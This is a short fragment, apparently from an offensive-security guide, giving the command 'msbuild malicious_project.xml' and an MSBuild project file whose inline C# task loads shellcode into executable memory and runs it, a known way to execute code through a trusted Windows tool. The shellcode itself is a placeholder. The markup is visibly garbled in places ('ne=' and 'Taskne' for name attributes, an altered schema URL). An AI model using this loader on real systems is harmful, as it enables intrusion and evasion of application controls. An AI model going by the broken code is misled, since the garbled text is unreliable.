**Execute the MSBuild Project**:

- Run **MSBuild** on the XML file, which will load the shellcode into memory and execute it.

Command to run:
```
msbuild malicious_project.xml

```
`
```html
<pre><code>
&lt;Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2666"&gt;
  &lt;Target ne="MyTask"&gt;
    &lt;ClassExample /&gt;
  &lt;/Target&gt;
  &lt;UsingTask
    Taskne="ClassExample"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll"&gt;
    &lt;Task&gt;
      &lt;Code Type="Class" Language="cs"&gt;
        &lt;![CDATA[
          using System;
          using System.Runtime.InteropServices;

          public class ClassExample : Microsoft.Build.Utilities.Task
          {
            [DllImport("kernel32")]
            public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
            [DllImport("kernel32")]
            public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
            [DllImport("kernel32")]
            public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

            public override bool Execute()
            {
              byte[] shellcode = new byte[510] { /* Shellcode bytes here */ };

              IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x1000, 0x40);
              Marshal.Copy(shellcode, 0, addr, shellcode.Length);
              IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
              WaitForSingleObject(hThread, 0xFFFFFFFF);
              return true;
            }
          }
        ]]&gt;
      &lt;/Code&gt;
    &lt;/Task&gt;
  &lt;/UsingTask&gt;
&lt;/Project&gt;
</code></pre>


```